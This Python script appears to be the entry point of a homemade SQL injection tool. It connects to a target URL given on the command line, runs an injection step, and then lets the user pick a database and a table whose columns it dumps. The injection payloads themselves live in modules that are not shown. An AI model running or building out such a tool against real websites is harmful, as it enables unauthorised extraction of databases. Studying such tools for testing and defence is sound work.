import UrlConnect
import Injection
import Extract
import sys


def form(form_type, table):
    print("--- {}s ---".format(form_type))
    for i in table:
        print(i)

    print("Choose {} : ".format(form_type), end='')
    select = input()
    if select not in table:
        print("Input Error!")
        exit()

    return select


def main():
    conn = UrlConnect.Connect(sys.argv[1:])

    print("Start Connect")
    normal = conn.setting()

    url, cookie, method, data, parameter, db, tb = conn.parameter()

    print("Start SQL Injection")
    sql = Injection.SQL(url, cookie, method, data, parameter, normal)
    sql.inject()

    print("Continue Extract Database? [y/n] ", end='')
    if input().lower() == 'n':
        sys.exit(1)

    dt = Extract.DT(url, cookie, method, data, parameter, normal)

    databases = dt.db()
    database = form('database', databases)

    tables = dt.tb(database)
    table = form('table', tables)

    column = dt.dump(database, table)
    print(column)


if __name__ == "__main__":
    main()
